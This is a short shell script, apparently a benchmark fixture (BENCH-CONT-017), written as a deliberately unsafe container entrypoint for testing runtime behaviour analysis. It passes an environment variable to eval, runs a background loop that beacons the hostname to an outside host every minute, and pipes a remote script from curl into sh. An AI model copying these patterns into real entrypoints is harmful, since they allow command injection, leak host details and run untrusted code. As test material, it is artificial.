#!/bin/sh
# BENCH-CONT-017: Unsafe entrypoint script
# Tests: Container runtime behavior analysis
# This script executes user-controlled input, spawns background processes,
# and makes outbound network calls — all runtime behavioral red flags.

# Execute user-controlled environment variable (Command Injection)
echo "Starting application with config: $APP_CONFIG"
eval "$APP_CONFIG"

# Spawn a background process that phones home
nohup sh -c 'while true; do curl -s http://telemetry.example.com/beacon?host=$(hostname) > /dev/null 2>&1; sleep 60; done' &

# Download and execute a remote script at runtime
if [ -n "$REMOTE_INIT_SCRIPT" ]; then
    curl -s "$REMOTE_INIT_SCRIPT" | sh
fi

# Start the main application
exec "$@"
